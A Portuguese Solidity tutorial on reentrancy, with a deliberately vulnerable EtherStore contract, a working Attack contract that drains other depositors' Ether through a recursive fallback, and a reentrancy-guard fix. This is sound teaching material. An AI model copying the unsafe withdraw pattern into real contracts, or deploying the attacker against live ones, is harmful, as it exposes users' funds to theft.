# Reentrada

#### Vulnerabilidade <a href="#vulnerability" id="vulnerability"></a>

Vamos dizer que o contrato`A` chama o contrato `B`.

A exploração de reentrada permite `B` chamar de volta `A` antes que `A` termine a execução.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

/*
EtherStore é um contrato onde você pode depositar e retirar ETH.
Esse contrato é vulnerável a ataque de reentrada.
Vamos ver por quê.

1. Implemente EtherStore
2. Deposite 1 Ether cada da Conta 1 (Alice) e Conta 2 (Bob) na EtherStore
3. Implemente Attack com endereço da EtherStore
4. Chama Attack.attack enviando 1 ether (usando a Conta 3 (Eve)).
   Você obterá 3 Ethers de volta (2 Ether roubados de Alice e Bob,
   mais 1 Ether enviado desse contrato).

O que aconteceu?
Attack foi capaz de chamar EtherStore.withdraw múltiplas vezes antes que
EtherStore.withdraw terminasse de executar.

Aqui está como as funções foram chamadas
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
*/

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Função Helper para verificar o saldo desse contrato
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback é chamada quando EtherStore envia Ether para esse contrato.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Função Helper para checar o balanço nesse contrato
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

#### Técnicas preventivas <a href="#preventative-techniques" id="preventative-techniques"></a>

* Certifique-se  de que todas as mudanças de estado acontecem antes de chamar os contratos externos
* Use modificadores de função que impedem a reentrada

Eis um exemplo de proteção contra reentrada

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

contract ReEntrancyGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}
```
